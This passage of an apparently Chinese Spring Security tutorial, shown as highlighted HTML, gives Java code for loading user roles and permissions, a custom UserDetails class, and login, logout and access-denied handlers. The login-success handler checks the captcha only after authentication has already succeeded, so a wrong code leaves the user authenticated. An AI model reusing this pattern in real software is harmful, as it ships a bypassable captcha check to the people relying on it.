<span class=\"token operator\">:</span> roleIdList<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\n                    <span class=\"token class-name\">Role</span> role <span class=\"token operator\">=</span> roleService<span class=\"token punctuation\">.</span><span class=\"token function\">getById</span><span class=\"token punctuation\">(</span>roleId<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n                    simpleGrantedAuthorities<span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">SimpleGrantedAuthority</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"ROLE_\"</span> <span class=\"token operator\">+</span> role<span class=\"token punctuation\">.</span><span class=\"token function\">getRoleName</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n                <span class=\"token punctuation\">&#125;</span>\n\n                <span class=\"token class-name\">List</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">Long</span><span class=\"token punctuation\">></span></span> permissionIdList <span class=\"token operator\">=</span> userPermissionService<span class=\"token punctuation\">.</span><span class=\"token function\">selectByUserId</span><span class=\"token punctuation\">(</span>user<span class=\"token punctuation\">.</span><span class=\"token function\">getId</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n                <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">Long</span> permissionId <span class=\"token operator\">:</span> permissionIdList<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\n                    <span class=\"token class-name\">Permission</span> permission <span class=\"token operator\">=</span> permissionService<span class=\"token punctuation\">.</span><span class=\"token function\">getById</span><span class=\"token punctuation\">(</span>permissionId<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n                    simpleGrantedAuthorities<span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">SimpleGrantedAuthority</span><span class=\"token punctuation\">(</span>permission<span class=\"token punctuation\">.</span><span class=\"token function\">getPermissionName</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n                <span class=\"token punctuation\">&#125;</span>\n\n\n            <span class=\"token punctuation\">&#125;</span>\n\n            <span class=\"token keyword\">return</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">MyUser</span><span class=\"token punctuation\">(</span>username<span class=\"token punctuation\">,</span> user<span class=\"token punctuation\">.</span><span class=\"token function\">getPassword</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> simpleGrantedAuthorities<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">Exception</span> e<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n\n            e<span class=\"token punctuation\">.</span><span class=\"token function\">printStackTrace</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n            <span class=\"token keyword\">return</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">MyUser</span><span class=\"token punctuation\">(</span>username<span class=\"token punctuation\">,</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">,</span> simpleGrantedAuthorities<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"创建自己的User认证类\"><a href=\"#创建自己的User认证类\" class=\"headerlink\" title=\"创建自己的User认证类\"></a>创建自己的User认证类</h3><p>实现UserDetial接口</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">MyUser</span> <span class=\"token keyword\">implements</span> <span class=\"token class-name\">UserDetails</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">private</span> <span class=\"token class-name\">String</span> username<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">private</span> <span class=\"token class-name\">String</span> password<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">private</span> <span class=\"token class-name\">Collection</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token operator\">?</span> <span class=\"token keyword\">extends</span> <span class=\"token class-name\">GrantedAuthority</span><span class=\"token punctuation\">></span></span> grantedAuthorities<span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token class-name\">MyUser</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span> username<span class=\"token punctuation\">,</span> <span class=\"token class-name\">String</span> password<span class=\"token punctuation\">,</span> <span class=\"token class-name\">Collection</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token operator\">?</span> <span class=\"token keyword\">extends</span> <span class=\"token class-name\">GrantedAuthority</span><span class=\"token punctuation\">></span></span> grantedAuthorities<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>username <span class=\"token operator\">=</span> username<span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>password <span class=\"token operator\">=</span> password<span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>grantedAuthorities <span class=\"token operator\">=</span> grantedAuthorities<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token annotation punctuation\">@Override</span>\n    <span class=\"token keyword\">public</span> <span class=\"token class-name\">Collection</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token operator\">?</span> <span class=\"token keyword\">extends</span> <span class=\"token class-name\">GrantedAuthority</span><span class=\"token punctuation\">></span></span> <span class=\"token function\">getAuthorities</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>grantedAuthorities<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token annotation punctuation\">@Override</span>\n    <span class=\"token keyword\">public</span> <span class=\"token class-name\">String</span> <span class=\"token function\">getPassword</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>password<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token annotation punctuation\">@Override</span>\n    <span class=\"token keyword\">public</span> <span class=\"token class-name\">String</span> <span class=\"token function\">getUsername</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>username<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token annotation punctuation\">@Override</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">boolean</span> <span class=\"token function\">isAccountNonExpired</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token annotation punctuation\">@Override</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">boolean</span> <span class=\"token function\">isAccountNonLocked</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token annotation punctuation\">@Override</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">boolean</span> <span class=\"token function\">isCredentialsNonExpired</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token annotation punctuation\">@Override</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">boolean</span> <span class=\"token function\">isEnabled</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"添加处理器\"><a href=\"#添加处理器\" class=\"headerlink\" title=\"添加处理器\"></a>添加处理器</h3><h4 id=\"登录成功处理器\"><a href=\"#登录成功处理器\" class=\"headerlink\" title=\"登录成功处理器\"></a>登录成功处理器</h4><pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">LoginSuccessHandler</span> <span class=\"token keyword\">implements</span> <span class=\"token class-name\">AuthenticationSuccessHandler</span> <span class=\"token punctuation\">&#123;</span>\n\n    <span class=\"token comment\">// private String url;</span>\n\n    <span class=\"token comment\">// public LoginSuccessHandler(String url)&#123;</span>\n    <span class=\"token comment\">//     this.url = url;</span>\n    <span class=\"token comment\">// &#125;</span>\n\n    <span class=\"token annotation punctuation\">@Override</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">onAuthenticationSuccess</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">HttpServletRequest</span> request<span class=\"token punctuation\">,</span> <span class=\"token class-name\">HttpServletResponse</span> response<span class=\"token punctuation\">,</span> <span class=\"token class-name\">Authentication</span> authentication<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">IOException</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">ServletException</span> <span class=\"token punctuation\">&#123;</span>\n\n        <span class=\"token comment\">// 获取客户端ip</span>\n        <span class=\"token comment\">// System.out.println(request.getRemoteAddr());</span>\n\n        <span class=\"token comment\">// 获取SpringSecurity里面的User对象</span>\n        <span class=\"token comment\">// User user = (User) authentication.getPrincipal();</span>\n        <span class=\"token comment\">// 获取权限列表</span>\n        <span class=\"token comment\">// System.out.println(user.getAuthorities());</span>\n        <span class=\"token comment\">//  获取用户名</span>\n        <span class=\"token comment\">// System.out.println(user.getUsername());</span>\n        <span class=\"token comment\">// 获取用户密码，null，为了安全</span>\n        <span class=\"token comment\">// System.out.println(user.getPassword());</span>\n        <span class=\"token comment\">// response.sendRedirect(this.url);</span>\n\n        response<span class=\"token punctuation\">.</span><span class=\"token function\">setContentType</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"application/json;charset=utf-8\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        response<span class=\"token punctuation\">.</span><span class=\"token function\">setStatus</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">HttpServletResponse</span><span class=\"token punctuation\">.</span><span class=\"token constant\">SC_OK</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token class-name\">PrintWriter</span> writer <span class=\"token operator\">=</span> response<span class=\"token punctuation\">.</span><span class=\"token function\">getWriter</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token class-name\">String</span> code <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">)</span> request<span class=\"token punctuation\">.</span><span class=\"token function\">getSession</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">getAttribute</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"code\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span>code<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">HttpSession</span> session <span class=\"token operator\">=</span> request<span class=\"token punctuation\">.</span><span class=\"token function\">getSession</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">String</span> id <span class=\"token operator\">=</span> session<span class=\"token punctuation\">.</span><span class=\"token function\">getId</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span>id<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>code<span class=\"token punctuation\">.</span><span class=\"token function\">toLowerCase</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">equals</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">)</span> request<span class=\"token punctuation\">.</span><span class=\"token function\">getParameter</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"code\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">toLowerCase</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n            <span class=\"token comment\">// Authentication authentication = SecurityContextHolder.getContext().getAuthentication();</span>\n            <span class=\"token comment\">// System.out.println(authentication.getPrincipal());</span>\n\n            <span class=\"token class-name\">MyUser</span> principal <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">MyUser</span><span class=\"token punctuation\">)</span> <span class=\"token class-name\">SecurityContextHolder</span><span class=\"token punctuation\">.</span><span class=\"token function\">getContext</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n                    <span class=\"token punctuation\">.</span><span class=\"token function\">getAuthentication</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n                    <span class=\"token punctuation\">.</span><span class=\"token function\">getPrincipal</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n            <span class=\"token class-name\">User</span> user <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">User</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n            <span class=\"token class-name\">BeanUtils</span><span class=\"token punctuation\">.</span><span class=\"token function\">copyProperties</span><span class=\"token punctuation\">(</span>principal<span class=\"token punctuation\">,</span> user<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n            request<span class=\"token punctuation\">.</span><span class=\"token function\">getSession</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">setAttribute</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"user\"</span><span class=\"token punctuation\">,</span> user<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n            writer<span class=\"token punctuation\">.</span><span class=\"token function\">write</span><span class=\"token punctuation\">(</span><span class=\"token constant\">JSON</span><span class=\"token punctuation\">.</span><span class=\"token function\">toJSONString</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">R</span>\n                    <span class=\"token punctuation\">.</span><span class=\"token function\">ok</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">REnum</span><span class=\"token punctuation\">.</span><span class=\"token constant\">LOGIN_SUCCESS</span><span class=\"token punctuation\">.</span><span class=\"token function\">getStatusCode</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token class-name\">REnum</span><span class=\"token punctuation\">.</span><span class=\"token constant\">LOGIN_SUCCESS</span><span class=\"token punctuation\">.</span><span class=\"token function\">getStatusMsg</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span>\n\n            writer<span class=\"token punctuation\">.</span><span class=\"token function\">write</span><span class=\"token punctuation\">(</span><span class=\"token constant\">JSON</span><span class=\"token punctuation\">.</span><span class=\"token function\">toJSONString</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">R</span><span class=\"token punctuation\">.</span><span class=\"token function\">error</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">REnum</span><span class=\"token punctuation\">.</span><span class=\"token constant\">VALIDATE_CODE_ERROR</span><span class=\"token punctuation\">.</span><span class=\"token function\">getStatusCode</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token class-name\">REnum</span><span class=\"token punctuation\">.</span><span class=\"token constant\">VALIDATE_CODE_ERROR</span><span class=\"token punctuation\">.</span><span class=\"token function\">getStatusMsg</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n\n        writer<span class=\"token punctuation\">.</span><span class=\"token function\">flush</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h4 id=\"登录失败处理器\"><a href=\"#登录失败处理器\" class=\"headerlink\" title=\"登录失败处理器\"></a>登录失败处理器</h4><pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">LoginFailHandler</span> <span class=\"token keyword\">implements</span> <span class=\"token class-name\">AuthenticationFailureHandler</span> <span class=\"token punctuation\">&#123;</span>\n\n    <span class=\"token annotation punctuation\">@Override</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">onAuthenticationFailure</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">HttpServletRequest</span> request<span class=\"token punctuation\">,</span> <span class=\"token class-name\">HttpServletResponse</span> response<span class=\"token punctuation\">,</span> <span class=\"token class-name\">AuthenticationException</span> exception<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">IOException</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">ServletException</span> <span class=\"token punctuation\">&#123;</span>\n\n        response<span class=\"token punctuation\">.</span><span class=\"token function\">setContentType</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"application/json;charset=utf-8\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        response<span class=\"token punctuation\">.</span><span class=\"token function\">setStatus</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">HttpServletResponse</span><span class=\"token punctuation\">.</span><span class=\"token constant\">SC_OK</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token class-name\">PrintWriter</span> writer <span class=\"token operator\">=</span> response<span class=\"token punctuation\">.</span><span class=\"token function\">getWriter</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token class-name\">String</span> code <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">)</span> request<span class=\"token punctuation\">.</span><span class=\"token function\">getSession</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">getAttribute</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"code\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        writer<span class=\"token punctuation\">.</span><span class=\"token function\">write</span><span class=\"token punctuation\">(</span><span class=\"token constant\">JSON</span><span class=\"token punctuation\">.</span><span class=\"token function\">toJSONString</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">R</span><span class=\"token punctuation\">.</span><span class=\"token function\">ok</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">REnum</span><span class=\"token punctuation\">.</span><span class=\"token constant\">LOGIN_FAIL</span><span class=\"token punctuation\">.</span><span class=\"token function\">getStatusCode</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n                <span class=\"token class-name\">REnum</span><span class=\"token punctuation\">.</span><span class=\"token constant\">LOGIN_FAIL</span><span class=\"token punctuation\">.</span><span class=\"token function\">getStatusMsg</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        writer<span class=\"token punctuation\">.</span><span class=\"token function\">flush</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h4 id=\"登出成功处理器\"><a href=\"#登出成功处理器\" class=\"headerlink\" title=\"登出成功处理器\"></a>登出成功处理器</h4><pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">LogoutSuccessHandler</span> <span class=\"token keyword\">implements</span> <span class=\"token class-name\"><span class=\"token namespace\">org<span class=\"token punctuation\">.</span>springframework<span class=\"token punctuation\">.</span>security<span class=\"token punctuation\">.</span>web<span class=\"token punctuation\">.</span>authentication<span class=\"token punctuation\">.</span>logout<span class=\"token punctuation\">.</span></span>LogoutSuccessHandler</span> <span class=\"token punctuation\">&#123;</span>\n\n\n    <span class=\"token annotation punctuation\">@Override</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">onLogoutSuccess</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">HttpServletRequest</span> request<span class=\"token punctuation\">,</span> <span class=\"token class-name\">HttpServletResponse</span> response<span class=\"token punctuation\">,</span> <span class=\"token class-name\">Authentication</span> authentication<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">IOException</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">ServletException</span> <span class=\"token punctuation\">&#123;</span>\n\n        response<span class=\"token punctuation\">.</span><span class=\"token function\">setContentType</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"application/json;charset=utf-8\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        response<span class=\"token punctuation\">.</span><span class=\"token function\">setStatus</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">HttpServletResponse</span><span class=\"token punctuation\">.</span><span class=\"token constant\">SC_OK</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token class-name\">PrintWriter</span> writer <span class=\"token operator\">=</span> response<span class=\"token punctuation\">.</span><span class=\"token function\">getWriter</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        writer<span class=\"token punctuation\">.</span><span class=\"token function\">write</span><span class=\"token punctuation\">(</span><span class=\"token constant\">JSON</span><span class=\"token punctuation\">.</span><span class=\"token function\">toJSONString</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">R</span><span class=\"token punctuation\">.</span><span class=\"token function\">ok</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">REnum</span><span class=\"token punctuation\">.</span><span class=\"token constant\">LOGOUT_SUCCESS</span><span class=\"token punctuation\">.</span><span class=\"token function\">getStatusCode</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n                <span class=\"token class-name\">REnum</span><span class=\"token punctuation\">.</span><span class=\"token constant\">LOGOUT_SUCCESS</span><span class=\"token punctuation\">.</span><span class=\"token function\">getStatusMsg</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        writer<span class=\"token punctuation\">.</span><span class=\"token function\">flush</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h4 id=\"403处理器\"><a href=\"#403处理器\" class=\"headerlink\" title=\"403处理器\"></a>403处理器</h4><pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">MyAccessDeniedHandler</span> <span class=\"token keyword\">implements</span> <span class=\"token class-name\">AccessDeniedHandler</span> <span class=\"token punctuation\">&#123;</span>\n\n\n    <span class=\"token annotation punctuation\">@Override</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">handle</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">HttpServletRequest</span> request<span class=\"token punctuation\">,</span> <span class=\"token class-name\">HttpServletResponse</span> response<span class=\"token punctuation\">,</span> <span class=\"token class-name\">AccessDeniedException</span> accessDeniedException<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">IOException</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">ServletException</span> <span class=\"token punctuation\">&#123;</span>\n\n        response<span class=\"token punctuation\">.</span><span class=\"token function\">setContentType</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"application/json;charset=utf-8\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        response<span class=\"token punctuation\">.</span><span class=\"token function\">setStatus</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">HttpServletResponse</span><span 